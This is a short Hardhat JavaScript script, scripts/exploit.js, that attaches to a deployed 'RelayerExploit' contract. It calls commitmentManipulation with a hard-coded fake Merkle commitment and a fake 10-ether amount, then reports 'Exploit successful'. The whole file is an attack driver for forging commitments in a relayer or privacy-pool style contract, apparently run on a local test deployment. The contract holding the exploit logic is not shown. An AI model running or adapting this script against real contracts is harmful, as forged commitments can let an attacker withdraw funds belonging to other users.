// scripts/exploit.js

async function main() {
    const [attacker] = await ethers.getSigners();
    console.log("Attempting Merkle Tree commitment manipulation with account:", attacker.address);

    const exploitAddress = "0xa513E6E4b8f2a923D98304ec87F64353C4D5C853";
    const RelayerExploit = await ethers.getContractFactory("RelayerExploit");
    const exploit = await RelayerExploit.attach(exploitAddress);

    const fakeCommitment = "0x123456789abcdef123456789abcdef123456789abcdef123456789abcdef1234";
    const fakeAmount = ethers.utils.parseEther("10");

    try {
        const tx = await exploit.commitmentManipulation(fakeCommitment, fakeAmount);
        await tx.wait();
        console.log("Exploit successful, commitment manipulation executed.");
    } catch (error) {
        console.error("Exploit error:", error);
    }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error("Error in exploit script:", error);
      process.exit(1);
  });
